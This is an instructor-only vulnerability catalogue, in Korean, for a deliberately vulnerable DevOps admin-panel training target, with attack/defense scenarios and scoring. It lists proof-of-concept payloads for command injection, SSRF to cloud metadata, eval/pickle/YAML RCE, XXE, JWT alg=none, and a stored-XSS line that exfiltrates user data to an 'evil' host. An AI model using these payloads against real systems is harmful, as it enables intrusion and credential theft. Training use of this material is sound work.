# AdminConsole — 28 취약점 카탈로그

> ⚠️ 강사·평가자 전용. DevOps 관리자 패널 의도적 취약 시스템. **외부 노출 절대 금지.**

## 강조 영역
SSRF · RCE (eval / pickle / yaml / cmd inject / file upload) · 비밀번호 분실 흐름 · 기본 자격증명 · IDOR

## 매핑

| # | 코드 | OWASP | 카테고리 | 위치 | PoC |
|---|------|-------|----------|------|-----|
| 1 | V01 | A03 Injection | Cmd inject — ping | `POST /tools tool=ping target=` | `127.0.0.1; id` |
| 2 | V02 | A03 Injection | Cmd inject — dig | 같은 endpoint tool=dig | `example.com; cat /etc/passwd` |
| 3 | V03 | A03 Injection | Cmd inject — whois | tool=whois | `example.com; uname -a` |
| 4 | V04 | A10 SSRF | URL fetch — internal/private | tool=fetch | `http://169.254.169.254/latest/meta-data/` |
| 5 | V05 | A10 SSRF | webhook test | `GET /api/webhook/test?url=` | `file:///etc/passwd` 또는 metadata IP |
| 6 | V06 | A10/A03 | git ls-remote arbitrary URL | tool=git_clone | `--upload-pack=touch /tmp/pwn https://example.com/r.git` |
| 7 | V07 | A03 RCE | eval calculator | tool=calc | `__import__('os').popen('id').read()` |
| 8 | V08 | A08 Integrity | pickle deserialization | `POST /api/jobs/import` raw | `pickle.dumps(R())` payload |
| 9 | V09 | A05 Misconfig | Path Traversal — file read | `GET /files/read?path=` | `path=/etc/passwd` |
| 10 | V10 | A05/A03 | LFI + log poisoning | UA에 `<?php` 주입 → `/files/read?path=logs/app.log` | UA payload + read |
| 11 | V11 | A07 AuthFail | 약한 reset token | `/forgot` → `/reset?token=` | `md5(email + YYYYMMDD)[:12]` 예측 |
| 12 | V12 | A07 AuthFail | reset email enumeration | `/forgot` 응답 | "등록되지 않음" / 정상 분기 차이 |
| 13 | V13 | A07 AuthFail | reset token 만료 0 | reset_tokens.created_at 미체크 | 1주 전 토큰도 동작 |
| 14 | V14 | A07 AuthFail | default admin/admin | `/login` | `admin/admin` |
| 15 | V15 | A02 Crypto | JWT alg=none | `Authorization: Bearer ey...` | header `{"alg":"none"}` payload `{"sub":"admin"}` |
| 16 | V16 | A01 BAC | IDOR — secrets | `GET /api/secrets/<id>` | `/api/secrets/1` (admin AWS key) |
| 17 | V17 | A08 Integrity | yaml.unsafe_load | `POST /api/jobs/import.yaml` | `!!python/object/apply:os.system ['id']` |
| 18 | V18 | A02 Crypto | hardcoded SHARED_SECRET | source 노출 | `ac-shared-secret-2026` (HMAC bypass 잠재) |
| 19 | V19 | A09 Logging | Verbose 500 + ENV | `GET /api/debug/raise` | stack + env subset |
| 20 | V20 | A07 AuthFail | API auth 누락 | `GET /api/users/list` | 인증 없이 모든 사용자/api_token 노출 |
| 21 | V21 | A08 Integrity | CSRF — JSON POST 토큰 0 | `POST /api/users/update` | 외부 fetch + cookie |
| 22 | V22 | A03 Injection | Stored XSS — admin notes | `POST /notes` | `<script>fetch('/api/users/list').then(r=>r.json()).then(j=>fetch('//evil/'+btoa(JSON.stringify(j))))</script>` |
| 23 | V23 | A01 BAC | Mass assign — role / api_token | `POST /api/users/update` | `{"id":2,"role":"admin","api_token":"new"}` |
| 24 | V24 | A08 Integrity | Upload .py / .sh | `POST /upload` | `evil.py` → `python uploads/evil.py` (gadget) |
| 25 | V25 | A05 Misconfig | XXE | `POST /api/import.xml` | `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>` |
| 26 | V26 | A05 Misconfig | HTTP smuggling 표면 | TE+CL 둘 다 통과 | front proxy 와 desync 시 무인증 통과 |
| 27 | V27 | A10 SSRF계열 | Open redirect SSO | `GET /sso/return?next=` | `next=//evil.example/` |
| 28 | V28 | A09/A02 | API token in URL query | `GET /api/console?token=` | URL/access log 노출 → token theft |

## 권장 공방 시나리오 (Battle 기준)

| 단계 | 공격 (RED) | 방어 (BLUE) |
|------|-----------|-------------|
| 정찰 | `Server: Werkzeug` banner / V20 `/api/users/list` 덤프 | banner 제거, API 인증 |
| 초기 침투 | V14 admin/admin → V07 calc eval `os.system('id')` | 기본 PW 차단, eval 제거, allowlist 계산기 |
| LPE-equivalent | V01-V03 cmd inject → 컨테이너 내 셸 | shlex.quote, allowlist target |
| 데이터 탈취 | V04 SSRF cloud metadata + V16 IDOR secrets + V20 token 덤프 | egress allowlist, RBAC, secret store separation |
| 권한 상승 (앱) | V11 reset token 예측 → admin PW 변경 / V15 JWT none / V23 mass assign role | 강한 token (256bit) + 만료, JWT alg whitelist, 필드 allowlist |
| RCE chain | V08 pickle / V17 yaml / V24 .py upload | safe loaders only, 업로드 확장자/실행권한 차단 |
| 흔적/지속성 | V10 LFI + log poisoning, V22 stored XSS | 로그 redact + viewer escape, DOMPurify |

## 점수 가중

| 난이도 | claim 점수 | 사례 |
|--------|-----------|------|
| Trivial | +5 | V14 admin/admin, V19 stack, V28 token in URL |
| Easy | +10 | V20 users dump, V09 LFI, V27 open redirect |
| Medium | +20 | V01-V03 cmd inject, V04/V05 SSRF, V11 reset token, V16 IDOR |
| Hard | +30 | V07 eval RCE, V08 pickle, V15 JWT none, V25 XXE |
| Chain | +40 | V14 admin → V07 eval → reverse shell · V11 reset → V23 role=admin → V16 secrets dump |

## 운영자 점검
- 실행: `python app.py` (port 3004)
- DB 초기화: `adminconsole.db` 삭제 후 재실행
- 로그: `logs/app.log` (V10 log poisoning 표적)
- `apt-get` 으로 ping/dig/whois/git/curl 사전 설치 필요 (Dockerfile 포함)
